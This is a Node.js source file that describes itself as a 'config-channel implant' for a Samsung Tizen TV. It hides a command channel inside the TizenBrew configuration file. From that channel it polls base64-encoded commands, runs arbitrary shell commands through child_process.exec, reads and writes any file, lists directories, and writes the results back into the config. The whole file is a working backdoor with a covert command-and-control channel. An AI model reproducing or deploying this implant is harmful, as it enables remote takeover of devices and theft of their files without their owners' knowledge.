"use strict";
/* Config-channel implant v3.
   PC -> TV : ModuleAction add  "CMD_<id>_<b64url(op\nargs...)>"
   TV -> PC : GetModules(true) returns "RES_<id>_<b64url(json)>"
   Node 4.4.3 / uid 5001. No execSync (native abort on this runtime) - async exec only. */

var fs = require('fs');
var CFG = '/home/owner/share/tizenbrewConfig.json';
var TMP = CFG + '.probe.tmp';

function b64e(s) {
    return new Buffer(s, 'utf8').toString('base64')
        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
function b64d(s) {
    return new Buffer(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
}
function readCfg() {
    try { return JSON.parse(fs.readFileSync(CFG, 'utf8')); }
    catch (e) { return null; }
}
function writeCfg(c) {
    try {
        fs.writeFileSync(TMP, JSON.stringify(c, null, 4));
        fs.renameSync(TMP, CFG);
    } catch (e) {
        try { fs.writeFileSync(CFG, JSON.stringify(c, null, 4)); } catch (e2) {}
    }
}
function trunc(s, n) {
    if (typeof s !== 'string') { return s; }
    if (s.length <= n) { return s; }
    return s.slice(0, n) + '\n...[truncated ' + (s.length - n) + ' chars]';
}

var cp = null;
try { cp = require('child_process'); } catch (e) {}

/* --- boot: drop stale commands, announce --- */
(function boot() {
    var c = readCfg();
    if (!c) { return; }
    if (!c.modules) { c.modules = []; }
    c.modules = c.modules.filter(function (m) { return m.indexOf('CMD_') !== 0; });
    c.modules.push('BOOT_' + b64e(JSON.stringify({
        v: 5,
        node: process.version,
        uid: (typeof process.getuid === 'function') ? process.getuid() : null,
        cp: !!cp,
        exec: cp ? typeof cp.exec : 'none',
        cwd: (typeof process.cwd === 'function') ? process.cwd() : null
    })));
    writeCfg(c);
})();

function reply(id, result) {
    var c = readCfg();
    if (!c) { return; }
    if (!c.modules) { c.modules = []; }
    c.modules.push('RES_' + id + '_' + b64e(JSON.stringify(result)));
    writeCfg(c);
}

function doSyncOp(op, rest) {
    if (op === 'ping') { return { pong: true, v: 5, node: process.version }; }
    if (op === 'read') {
        var b = fs.readFileSync(rest);
        return { size: b.length, b64: b.toString('base64') };
    }
    if (op === 'readchunk') {
        var spec = rest.split('\n');
        var p = spec[0], off = parseInt(spec[1], 10) || 0, len = parseInt(spec[2], 10) || 65536;
        var fd = fs.openSync(p, 'r');
        var buf = new Buffer(len);
        var n = fs.readSync(fd, buf, 0, len, off);
        fs.closeSync(fd);
        return { size: n, off: off, eof: n < len, b64: buf.slice(0, n).toString('base64') };
    }
    if (op === 'write') {
        var sp = rest.split('\n');
        var data = new Buffer(sp[1] || '', 'base64');
        fs.writeFileSync(sp[0], data);
        return { written: data.length, path: sp[0] };
    }
    if (op === 'ls') {
        var items = fs.readdirSync(rest);
        return { path: rest, count: items.length, entries: items.slice(0, 500) };
    }
    if (op === 'stat') {
        var st = fs.statSync(rest);
        return {
            path: rest, size: st.size, mode: st.mode, uid: st.uid, gid: st.gid,
            isDir: st.isDirectory(), isFile: st.isFile()
        };
    }
    if (op === 'readlink') { return { path: rest, target: fs.readlinkSync(rest) }; }
    return { error: 'unknown op: ' + op };
}

function runCmd(entry) {
    var rest = entry.slice(4);
    var i = rest.indexOf('_');
    if (i < 0) { return; }
    var id = rest.slice(0, i);
    var payload;
    try { payload = b64d(rest.slice(i + 1)); }
    catch (e) { reply(id, { error: 'bad payload' }); return; }

    var nl = payload.indexOf('\n');
    var op = nl < 0 ? payload : payload.slice(0, nl);
    var args = nl < 0 ? '' : payload.slice(nl + 1);

    if (op === 'exec' || op === 'spawn') {
        if (!cp || typeof cp.exec !== 'function') { reply(id, { error: 'no cp.exec' }); return; }
        var done = false;
        var finish = function (res) {
            if (done) { return; }
            done = true;
            reply(id, res);
        };
        try {
            var child = cp.exec(args, {
                encoding: 'utf8', timeout: 25000, maxBuffer: 8 * 1024 * 1024
            }, function (err, stdout, stderr) {
                finish({
                    code: err && typeof err.code !== 'undefined' ? err.code : 0,
                    error: err ? String(err) : null,
                    stdout: trunc(stdout || '', 6000),
                    stderr: trunc(stderr || '', 2000)
                });
            });
        } catch (e) {
            finish({ error: 'spawn threw: ' + String(e) });
        }
        return;
    }

    var result;
    try { result = doSyncOp(op, args); }
    catch (e) { result = { error: String(e) }; }
    reply(id, result);
}

function tick() {
    try {
        var c = readCfg();
        if (c && c.modules) {
            var cmds = c.modules.filter(function (m) { return m.indexOf('CMD_') === 0; });
            if (cmds.length) {
                c.modules = c.modules.filter(function (m) { return m.indexOf('CMD_') !== 0; });
                writeCfg(c);
                for (var i = 0; i < cmds.length; i++) { runCmd(cmds[i]); }
            }
        }
    } catch (e) {}
    setTimeout(tick, 700);
}

tick();
